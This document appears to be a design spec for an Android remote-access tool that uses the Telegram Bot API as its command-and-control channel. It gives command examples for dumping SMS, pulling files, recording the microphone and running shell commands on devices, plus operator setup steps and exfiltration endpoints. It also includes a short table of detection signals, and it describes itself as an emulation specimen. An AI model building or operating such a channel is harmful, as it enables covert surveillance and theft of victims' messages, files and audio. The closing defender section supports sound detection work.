# Telegram C2 Protocol

## Transport

Telegram Bot API over HTTPS. No custom server, no ports to open, no infrastructure to take down — the channel survives takedowns.

- **Poll**: `GET https://api.telegram.org/bot<TOKEN>/getUpdates?timeout=30&offset=<N>`
- **Text out**: `POST https://api.telegram.org/bot<TOKEN>/sendMessage` (`chat_id`, `text`, `parse_mode=HTML`)
- **Binary out**: `POST .../sendDocument | sendPhoto | sendVoice` (multipart: `chat_id`, `caption`, file part)

## Command format

```
/id <deviceId> <command> [args...]
```

- `/id` is the namespace prefix — one bot can serve many devices.
- `deviceId` is the 8-char id generated on first launch and shown on the device screen.
- `all` as the deviceId targets every device the bot talks to.
- Replies are posted back to the same chat.

Examples:
```
/id a1b2c3d4 devinfo
/id a1b2c3d4 sms 50
/id a1b2c3d4 ls /sdcard/Download
/id a1b2c3d4 pull /sdcard/Download/report.pdf
/id a1b2c3d4 mic 20
/id a1b2c3d4 sh getprop ro.build.version.release
/id all ping
```

## Reply envelope

Every handler returns a JSON string so the channel stays machine-parseable:

```json
{"status":"ok","count":3,"sms":[{...}]}
{"status":"error","error":"no such path: /sdcard/x"}
```

Large replies are truncated at 3500 characters with a `...[truncated, full output on device]` marker; binary results are sent as separate attachments instead of inline.

## Bot setup (operator side)

1. `@BotFather` → `/newbot` → token (`123456:ABC-DEF...`).
2. Open the bot chat, send one message, then `/setprivacy` → **Disable** (so the bot receives commands addressed to other bots in the group, and so it can read replies in groups).
3. Get the chat id: message the bot, then `GET https://api.telegram.org/bot<TOKEN>/getUpdates` → `message.chat.id`. For groups it is negative.
4. Put both into the build (`--bot-token`, `--chat-id`) or into the app's on-device configuration screen.

## Behavioural notes

- **Polling** is long-poll with a 30 s timeout; the loop survives network loss with a 5 s backoff.
- **Offset tracking** is per-device in the agent's memory; after a reinstall the agent re-reads `getUpdates` and continues.
- **Rate limits**: Telegram caps message sends per chat per second (~30) and ~20 messages/minute per group. The `stream` capability paces frames at 2 s and caps the count.
- **Message size**: documents up to 50 MB via Bot API; the `pull` capability should chunk anything larger — split with `sh split -b 20m`.
- **HTML parse mode**: the app must escape `<`, `>` and `&` in any untrusted data it echoes back (file names, SMS bodies). Use `JSONObject.quote()` around user-controlled strings, or drop `parse_mode` for those replies.

## Detection anchors (what a defender sees)

| Signal | Where |
|---|---|
| `api.telegram.org/bot` in the APK | strings in the dex — immediate, high-confidence indicator |
| package name, service names, notification text | manifest and resources |
| `RAPTOR-EMULATION` marker string | deliberately embedded so the specimen is self-identifying |
| outbound TLS to `api.telegram.org` from an unexpected app | network telemetry |
| accessibility + notification-listener services enabled together | a strong behavioural combination |
| persistent notification on an app with no visible purpose | user-visible giveaway |

Build the YARA rule around the first and third signals — both are stable and unique.
